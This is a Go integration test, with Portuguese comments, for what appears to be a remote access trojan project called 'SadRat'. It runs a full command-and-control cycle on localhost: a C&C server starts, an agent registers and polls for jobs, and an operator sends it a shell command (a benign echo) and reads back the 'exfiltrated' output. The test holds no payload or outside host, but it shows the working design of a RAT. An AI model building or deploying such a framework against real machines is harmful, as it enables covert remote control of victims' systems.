package integration

import (
	"testing"
	"time"

	"github.com/VitorDie/SadRat/internal/factory"
	"github.com/VitorDie/SadRat/internal/repository"
)

func TestFullMalwareLifecycle(t *testing.T) {
	// ==========================================
	// 1. SETUP DA INFRAESTRUTURA (O C&C)
	// ==========================================
	// Usamos a porta 8181 para não conflitar com nada rodando na sua máquina
	serverURL := "http://localhost:8181"
	repo := repository.NewServerDBPlainDataInMemory()
	ratFactory := factory.NewRatFactoryHttp(repo, serverURL)

	// Inicia o Servidor C&C em uma Goroutine separada para não travar o teste
	handler := ratFactory.CreateHandler()
	go func() {
		err := handler.Start(":8181")
		if err != nil {
			t.Errorf("Falha catastrófica ao iniciar o servidor: %v", err)
		}
	}()

	// Dá 1 segundo de vantagem para o servidor subir as rotas HTTP e ficar pronto
	time.Sleep(1 * time.Second)


	// ==========================================
	// 2. INFECÇÃO (O Agente)
	// ==========================================
	// O Agente é instanciado e o seu loop infinito (Run) roda em outra Goroutine
	agent := ratFactory.CreateAgent()
	go func() {
		// O Run() do agente vai gerar a chave, se registrar, e iniciar o Long Polling
		err := agent.Run()
		if err != nil {
			t.Errorf("Erro no loop do agente: %v", err)
		}
	}()

	// Dá 1 segundo para o Agente bater na API e se registrar no Banco de Dados
	time.Sleep(1 * time.Second)


	// ==========================================
	// 3. OPERAÇÃO (O Cliente)
	// ==========================================
	client := ratFactory.CreateClient()

	// A. Requisitar zumbis disponíveis
	agents, err := client.RequestAvailableAgents()
	if err != nil {
		t.Fatalf("Erro ao buscar agentes: %v", err)
	}
	if len(agents) == 0 {
		t.Fatalf("Nenhum agente foi registrado no C&C! O Agente não funcionou.")
	}

	targetAgentID := agents[0].ID
	t.Logf("Agente detectado: %s", targetAgentID)

	// B. Mandar um comando letal (echo "Hello, World!")
	jobID, err := client.SendCommand("echo", []string{"Hello, World!"}, targetAgentID)
	if err != nil {
		t.Fatalf("Erro ao enviar comando: %v", err)
	}
	if jobID == "" {
		t.Fatalf("O servidor não retornou o ID do Job (Comando)")
	}
	t.Logf("Comando despachado com sucesso! Job ID: %s", jobID)


	// ==========================================
	// 4. ESPERA PELO LONG POLLING E EXECUÇÃO
	// ==========================================
	// Damos 3 segundos para: 
	// 1. O Agente perguntar ao server se tem Job
	// 2. O Agente executar no shell do SO
	// 3. O Agente mandar o POST com o resultado de volta pro Server
	time.Sleep(3 * time.Second)


	// ==========================================
	// 5. EXFILTRAÇÃO E VALIDAÇÃO (O Cliente lê o resultado)
	// ==========================================
	result, err := client.RequestJobResult(jobID)
	if err != nil {
		t.Fatalf("Erro ao buscar resultado do Job: %v", err)
	}

	// Dependendo de como você programar o agente, o echo pode adicionar uma quebra de linha (\n)
	expectedOutput := "Hello, World!\n"
	if result != expectedOutput && result != "Hello, World!" {
		t.Fatalf("Esperava '%s', mas o agente retornou '%s'", expectedOutput, result)
	}

	t.Logf("SUCESSO ABSOLUTO! Resultado: %s", result)
}
